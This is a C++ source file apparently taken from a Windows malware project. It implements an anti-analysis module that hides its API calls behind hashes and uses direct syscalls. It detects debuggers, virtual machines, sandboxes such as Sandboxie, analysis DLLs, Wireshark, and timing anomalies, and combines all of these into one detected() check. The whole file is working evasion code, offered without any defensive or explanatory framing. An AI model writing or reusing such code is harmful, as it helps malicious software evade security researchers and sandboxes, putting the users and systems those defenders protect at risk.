#include "AntiAnalysis.h"
#include "ApiHash.h"
#include "Syscalls.h"
#include "WmiQuery.h"

#include <windows.h>
#include <intrin.h>

#include <cstdint>
#include <cstring>
#include <string>

namespace aa {

namespace {

void* r(const char* dll, const char* fn) {
    return api::export_by_hash(API_HASH(dll), API_HASH(fn));
}

bool cpuid_hypervisor() {
    int regs[4] = {};
    __cpuid(regs, 1);
    return (regs[2] & (1 << 31)) != 0; // hypervisor-present bit
}

bool debugger_present() {
    // IsDebuggerPresent
    auto idp = reinterpret_cast<BOOL(WINAPI*)()>(r("kernel32.dll", "IsDebuggerPresent"));
    if (idp && idp()) return true;

    // CheckRemoteDebuggerPresent
    auto crdp = reinterpret_cast<BOOL(WINAPI*)(HANDLE, PBOOL)>(r("kernel32.dll", "CheckRemoteDebuggerPresent"));
    if (crdp) {
        BOOL b = FALSE;
        crdp((HANDLE)-1, &b);
        if (b) return true;
    }

    // NtQueryInformationProcess
    std::uint32_t dbg = 0;
    std::uint32_t len = 0;
    if (syscalls::ScQueryProcInfo((void*)-1, 7, &dbg, sizeof(dbg), &len) == 0 && dbg) return true;
    if (syscalls::ScQueryProcInfo((void*)-1, 0x1F, &dbg, sizeof(dbg), &len) == 0 && dbg) return true;
    return false;
}

bool timing_check() {
    auto gtc = reinterpret_cast<ULONGLONG(WINAPI*)()>(r("kernel32.dll", "GetTickCount64"));
    if (!gtc) return false;
    ULONGLONG t0 = gtc();
    Sleep(1000);
    ULONGLONG t1 = gtc();
    return (t1 - t0) < 950;
}

bool module_check() {
    static const char* bad[] = { "api_log.dll", "dir_watch.dll", "pstorec.dll",
        "vmcheck.dll", "wpespy.dll", "dbghelp.dll", "SbieDll.dll" };
    for (auto b : bad) {
        if (api::module_by_hash(API_HASH(b))) return true;
    }
    return false;
}

bool reg_check() {
    auto rok = reinterpret_cast<LONG(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY)>(
        r("advapi32.dll", "RegOpenKeyExA"));
    auto rck = reinterpret_cast<LONG(WINAPI*)(HKEY)>(r("advapi32.dll", "RegCloseKey"));
    if (!rok || !rck) return false;
    static const char* keys[] = {
        "Software\\VMware, Inc.\\VMware Tools",
        "Software\\Oracle\\VirtualBox Guest Additions",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Wireshark",
    };
    for (auto k : keys) {
        HKEY h = nullptr;
        if (rok(HKEY_LOCAL_MACHINE, k, 0, KEY_QUERY_VALUE, &h) == 0) { rck(h); return true; }
        if (rok(HKEY_CURRENT_USER, k, 0, KEY_QUERY_VALUE, &h) == 0) { rck(h); return true; }
    }
    return false;
}

} // namespace

bool detected() {
    if (cpuid_hypervisor()) return true;
    if (debugger_present()) return true;
    if (timing_check()) return true;
    if (module_check()) return true;
    if (reg_check()) return true;
    if (wmi::is_vm()) return true;
    return false;
}

} // namespace aa
